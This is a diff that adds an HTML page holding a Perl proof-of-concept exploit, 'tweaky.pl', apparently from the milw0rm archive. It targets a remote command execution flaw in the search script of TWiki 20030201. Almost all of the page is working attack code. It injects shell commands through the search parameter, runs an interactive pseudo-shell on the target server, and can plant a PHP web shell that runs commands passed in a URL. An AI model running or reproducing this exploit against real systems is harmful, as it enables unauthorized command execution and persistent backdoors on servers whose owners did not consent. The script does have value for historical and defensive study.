@@ -1,0 +1,234 @@
+<html>
+<head>
+<title>TWiki 20030201 search.pm Remote Command Execution Exploit</title>
+<pre>
+#!/usr/bin/perl
+
+# &quot;tweaky.pl&quot; v. 1.0 beta 2
+#
+# Proof of concept for TWiki vulnerability. Remote code execution
+# Vuln discovered, researched and exploited by RoMaNSoFt &lt;roman rs-labs com&gt;
+#
+# Madrid, 30.Sep.2004.
+
+
+require LWP::UserAgent;
+use Getopt::Long;
+
+### Default config
+$host = '';
+$path = '/cgi-bin/twiki/search/Main/';
+$secure = 0;
+$get = 0;
+$post = 0;
+$phpshellpath='';
+$createphpshell = '(echo `perl -e \'print chr(60).chr(63)\'` ; echo \'$out = shell_exec($_GET[&quot;cmd&quot;].
+&quot; 2\'`perl -e \'print chr(62).chr(38)\'`\'1&quot;);\' ; echo \'echo &quot;\'`perl -e \'print chr(60).&quot;pre&quot;.chr(62).&quot;\\\\
+$out&quot;.chr(60).&quot;/pre&quot;.chr(62)\'`\'&quot;;\' ; echo `perl -e \'print chr(63).chr(62)\'`) | tee ';
+$logfile = ''; # If empty, logging will be disabled
+$prompt = &quot;tweaky\$ &quot;;
+$useragent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)';
+$proxy = '';
+$proxy_user = '';
+$proxy_pass = '';
+$basic_auth_user = '';
+$basic_auth_pass = '';
+$timeout = 30;
+$debug = 0;
+$init_command = 'uname -a ; id';
+$start_mark = 'AAAA';
+$end_mark = 'BBBB';
+$pre_string = 'nonexistantttt\' ; (';
+$post_string = ') | sed \'s/\(.*\)/'.$start_mark.'\1'.$end_mark.'.txt/\' ; fgrep -i -l -- \'nonexistantttt';
+$delim_start = '&lt;b&gt;'.$start_mark;
+$delim_end = $end_mark.'&lt;/b&gt;';
+
+print &quot;Proof of concept for TWiki vulnerability. Remote code execution.\n&quot;;
+print &quot;(c) RoMaNSoFt, 2004. &lt;roman\@rs-labs.com&gt;\n\n&quot;;
+
+### User-supplied config (read from the command-line)
+$parsing_ok = GetOptions ('host=s' =&gt; \$host,
+'path=s' =&gt; \$path,
+'secure' =&gt; \$secure,
+'get' =&gt; \$get,
+'post' =&gt; \$post,
+'phpshellpath=s' =&gt; \$phpshellpath,
+'logfile=s' =&gt; \$logfile,
+'init_command=s' =&gt; \$init_command,
+'useragent=s' =&gt; \$useragent,
+'proxy=s' =&gt; \$proxy,
+'proxy_user=s' =&gt; \$proxy_user,
+'proxy_pass=s' =&gt; \$proxy_pass,
+'basic_auth_user=s' =&gt; \$basic_auth_user,
+'basic_auth_pass=s' =&gt; \$basic_auth_pass,
+'timeout=i' =&gt; \$timeout,
+'debug' =&gt; \$debug,
+'start_mark=s' =&gt; \$start_mark,
+'end_mark=s' =&gt; \$end_mark);
+
+### Some basic checks
+&amp;banner unless ($parsing_ok);
+
+if ($get and $post) {
+print &quot;Choose one only method! (GET or POST)\n\n&quot;;
+&amp;banner;
+}
+
+if (!($get or $post)) {
+# If not specified we prefer POST method
+$post = 1;
+}
+
+if (!$host) {
+print &quot;You must specify a target hostname! (tip: --host &lt;hostname&gt;)\n\n&quot; ;
+&amp;banner;
+}
+
+$url = ($secure ? 'https' : 'http') . &quot;://&quot; . $host . $path;
+
+### Checking for a vulnerable TWiki
+&amp;run_it ($init_command, 'RS-Labs rlz!');
+
+### Execute selected payload
+
+if ($phpshellpath) {
+&amp;create_phpshell;
+print &quot;PHPShell created.&quot;;
+} else {
+&amp;pseudoshell;
+}
+
+### End
+exit(0);
+
+
+### Create PHPShell
+sub create_phpshell {
+$createphpshell .= $phpshellpath;
+&amp;run_it($createphpshell, 'yeah!');
+}
+
+
+### Pseudo-shell
+sub pseudoshell {
+open(LOGFILE, &quot;&gt;&gt;$logfile&quot;) if $logfile;
+open(STDINPUT, '-');
+
+print &quot;Welcome to RoMaNSoFt's pseudo-interactive shell :-)\n[Type Ctrl-D or (bye, quit, exit, logout) to exit]\n
+\n&quot;.$prompt.$init_command.&quot;\n&quot;;
+&amp;run_it ($init_command);
+print $prompt;
+
+while (&lt;STDINPUT&gt;) {
+chop;
+if ($_ eq &quot;bye&quot; or $_ eq &quot;quit&quot; or $_ eq &quot;exit&quot; or $_ eq &quot;logout&quot;) {
+exit(1);
+}
+
+&amp;run_it ($_) unless !$_;
+print &quot;\n&quot;.$prompt;
+}
+
+close(STDINPUT);
+close(LOGFILE) if $logfile;
+}
+
+
+### Print banner and die
+sub banner {
+print &quot;Syntax: ./tweaky.pl --host=&lt;host&gt; [options]\n\n&quot;;
+print &quot;Proxy options: --proxy=http://proxy:port --proxy_user=foo --proxy_pass=bar\n&quot;;
+print &quot;Basic auth options: --basic_auth_user=foo --basic_auth_pass=bar\n&quot;;
+print &quot;Secure HTTP (HTTPS): --secure\n&quot;;
+print &quot;Path to CGI: --path=$path\n&quot;;
+print &quot;Method: --get | --post\n&quot;;
+print &quot;Enable logging: --logfile=/path/to/a/file\n&quot;;
+print &quot;Create PHPShell: --phpshellpath=/path/to/phpshell\n&quot;;
+
+exit(1);
+}
+
+
+### Execute command via vulnerable CGI
+sub run_it {
+my ($command, $testing_vuln) = @_;
+my $req;
+my $ua = new LWP::UserAgent;
+
+$ua-&gt;agent($useragent);
+$ua-&gt;timeout($timeout);
+
+# Build CGI param and urlencode it
+my $search = $pre_string . $command . $post_string;
+$search =~ s/(\W)/&quot;%&quot; . unpack(&quot;H2&quot;, $1)/ge;
+
+# Case GET
+if ($get) {
+$req = HTTP::Request-&gt;new('GET', $url . &quot;?scope=text&amp;order=modified&amp;search=$search&quot;);
+}
+
+# Case POST
+if ($post) {
+$req = new HTTP::Request POST =&gt; $url;
+$req-&gt;content_type('application/x-www-form-urlencoded');
+$req-&gt;content(&quot;scope=text&amp;order=modified&amp;search=$search&quot;);
+}
+
+# Proxy definition
+if ($proxy) {
+if ($secure) {
+# HTTPS request
+$ENV{HTTPS_PROXY} = $proxy;
+$ENV{HTTPS_PROXY_USERNAME} = $proxy_user;
+$ENV{HTTPS_PROXY_PASSWORD} = $proxy_pass; 
+} else {
+# HTTP request
+$ua-&gt;proxy(['http'] =&gt; $proxy);
+$req-&gt;proxy_authorization_basic($proxy_user, $proxy_pass); 
+}
+}
+
+# Basic Authorization
+$req-&gt;authorization_basic($basic_auth_user, $basic_auth_pass) if ($basic_auth_user);
+
+# Launch request and parse results
+my $res = $ua-&gt;request($req);
+
+if ($res-&gt;is_success) {
+
+print LOGFILE &quot;\n&quot;.$prompt.$command.&quot;\n&quot; if ($logfile and !$testing_vuln);
+@content = split(&quot;\n&quot;, $res-&gt;content);
+
+my $empty_response = 1;
+
+foreach $_ (@content) {
+my ($match) = ($_ =~ /$delim_start(.*)$delim_end/g);
+
+if ($debug) {
+print $_ . &quot;\n&quot;;
+} else {
+if ($match) {
+$empty_response = 0;
+print $match . &quot;\n&quot; unless ($testing_vuln);
+}
+}
+
+print LOGFILE $match . &quot;\n&quot; if ($match and $logfile and !$testing_vuln);
+}
+
+if ($empty_response) {
+if ($testing_vuln) {
+die &quot;Sorry, exploit didn't work!\nPerhaps TWiki is patched or you supplied a wrong URL 
+(remember it should point to Twiki's search page).\n&quot;;
+} else {
+print &quot;[Server issued an empty response. Perhaps you entered a wrong command?]\n&quot;;
+}
+}
+
+} else {
+die &quot;Couldn't connect to server. Error message follows:\n&quot; . $res-&gt;status_line . &quot;\n&quot;;
+} 
+}</pre>
+# milw0rm.com [2004-11-20]
+</html>
+
